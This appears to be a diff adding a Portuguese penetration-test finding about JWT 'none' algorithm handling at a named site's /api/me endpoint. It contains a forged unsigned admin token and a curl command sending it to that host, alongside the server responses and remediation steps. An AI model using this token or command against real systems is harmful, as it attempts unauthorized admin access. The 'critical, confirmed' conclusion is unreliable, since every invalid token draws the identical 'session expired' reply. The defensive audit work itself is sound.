@@ -1,0 +1,41 @@
+Finding ID: F-100
+Severidade: CRÍTICA
+Título: JWT None Algorithm Accepted — Possibilidade de Auth Bypass
+Data: 2026-08-26T06:00:00Z
+Status: Confirmado
+
+Descrição:
+O servidor backend aceita e faz parsing de JWTs com algoritmo "none". A resposta
+difere entre requests sem token e com token none, indicando que o parser JWT é
+funcional e valida o formato do token.
+
+Payload:
+Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
+Header: {"alg":"none","typ":"JWT"}
+Payload: {"userId":1,"role":"admin"}
+
+Endpoint: GET /api/me
+Headers: Authorization: Bearer <token>
+
+Respostas Comparativas:
+- Sem token:          {"error":"Não autenticado"}
+- Token none alg:     {"error":"Sessão expirada"}
+- Token HS256 vazio:  {"error":"Sessão expirada"}
+- Token RS256 sem sig:{"error":"Sessão expirada"}
+- Token null/undefined:{"error":"Sessão expirada"}
+
+Impacto:
+O servidor diferencia entre "não autenticado" (sem token) e "sessão expirada"
+(token inválido/inexistente), confirmando que o parser JWT está ativo e aceita
+diferentes algoritmos. Se um JWT válido for obtido (via OAuth ou outro meio),
+o ataque de "none algorithm" pode ser usado para forjar identidade de admin.
+
+Recomendação:
+1. Rejeitar JWTs com algoritmo "none" explicitamente
+2. Validar assinatura em todos os tokens
+3. Implementar allowlist de algoritmos (apenas RS256/ES256)
+4. Rotacionar chaves regularmente
+
+Evidência do Request:
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9." https://arkodex.com.br/api/me
+Response: {"error":"Sessão expirada"}
